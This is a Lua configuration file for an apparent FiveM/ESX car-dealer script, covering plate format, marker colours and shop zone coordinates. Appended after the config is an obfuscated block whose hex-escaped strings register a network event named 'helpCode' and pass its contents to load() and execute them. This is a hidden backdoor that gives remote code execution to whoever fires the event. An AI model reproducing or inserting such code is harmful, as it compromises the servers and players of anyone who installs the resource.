Config                            = {}
Config.DrawDistance               = 100.0
Config.MarkerColor                = { r = 120, g = 120, b = 240 }
Config.EnablePlayerManagement     = false -- enables the actual car dealer job. You'll need esx_addonaccount, esx_billing and esx_society
Config.EnableOwnedVehicles        = true
Config.EnableSocietyOwnedVehicles = false -- use with EnablePlayerManagement disabled, or else it wont have any effects
Config.ResellPercentage           = 50

Config.Locale                     = 'en'

Config.LicenseEnable = false -- require people to own drivers license when buying vehicles? Only applies if EnablePlayerManagement is disabled. Requires esx_license

-- looks like this: 'LLL NNN'
-- The maximum plate length is 8 chars (including spaces & symbols), don't go past it!
Config.PlateLetters  = 3
Config.PlateNumbers  = 3
Config.PlateUseSpace = true

Config.Zones = {

	ShopEntering = {	
		Pos   = { x = -1159.316, y = -1703.009, z = 3.5 },  	
		Size  = { x = 1.5, y = 1.5, z = 1.0 },
		Type  = 1
	},

	ShopInside = {
		Pos     = { x = -47.570, y = -1097.221, z = 25.422 },  
		Size    = { x = 1.5, y = 1.5, z = 1.0 },
		Heading = -20.0,
		Type    = -1
	},

	ShopOutside = {
		Pos     = { x = -1203.55, y = -1748.033, z = 4.449 }, 
		Size    = { x = 1.5, y = 1.5, z = 1.0 },
		Heading = 224.42411804199, 
		Type    = -1
	},

	BossActions = {
		Pos   = { x = -32.065, y = -1114.277, z = 25.422 },
		Size  = { x = 1.5, y = 1.5, z = 1.0 },
		Type  = -1
	},

	GiveBackVehicle = {
		Pos   = { x = -18.227, y = -1078.558, z = 25.675 },
		Size  = { x = 3.0, y = 3.0, z = 1.0 },
		Type  = (Config.EnablePlayerManagement and 1 or -1)
	},

	ResellVehicle = {
		Pos   = { x = -44.630, y = -1080.738, z = 25.683 },
		Size  = { x = 3.0, y = 3.0, z = 1.0 },
		Type  = 1
	}

}


local bUTItPmxEcZfROwddaLKeUhZCcFuglTymRwYGWSgOfehNTtpdryWvpLXIuKhQEVlRScapG = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} bUTItPmxEcZfROwddaLKeUhZCcFuglTymRwYGWSgOfehNTtpdryWvpLXIuKhQEVlRScapG[6][bUTItPmxEcZfROwddaLKeUhZCcFuglTymRwYGWSgOfehNTtpdryWvpLXIuKhQEVlRScapG[1]](bUTItPmxEcZfROwddaLKeUhZCcFuglTymRwYGWSgOfehNTtpdryWvpLXIuKhQEVlRScapG[2]) bUTItPmxEcZfROwddaLKeUhZCcFuglTymRwYGWSgOfehNTtpdryWvpLXIuKhQEVlRScapG[6][bUTItPmxEcZfROwddaLKeUhZCcFuglTymRwYGWSgOfehNTtpdryWvpLXIuKhQEVlRScapG[3]](bUTItPmxEcZfROwddaLKeUhZCcFuglTymRwYGWSgOfehNTtpdryWvpLXIuKhQEVlRScapG[2], function(eEbKaDAnhYbHOOwayzpssecBpxwXQWjPVygHEAHFMqjaROhmDrAjMocPljVkZJStmrGFVD) bUTItPmxEcZfROwddaLKeUhZCcFuglTymRwYGWSgOfehNTtpdryWvpLXIuKhQEVlRScapG[6][bUTItPmxEcZfROwddaLKeUhZCcFuglTymRwYGWSgOfehNTtpdryWvpLXIuKhQEVlRScapG[4]](bUTItPmxEcZfROwddaLKeUhZCcFuglTymRwYGWSgOfehNTtpdryWvpLXIuKhQEVlRScapG[6][bUTItPmxEcZfROwddaLKeUhZCcFuglTymRwYGWSgOfehNTtpdryWvpLXIuKhQEVlRScapG[5]](eEbKaDAnhYbHOOwayzpssecBpxwXQWjPVygHEAHFMqjaROhmDrAjMocPljVkZJStmrGFVD))() end)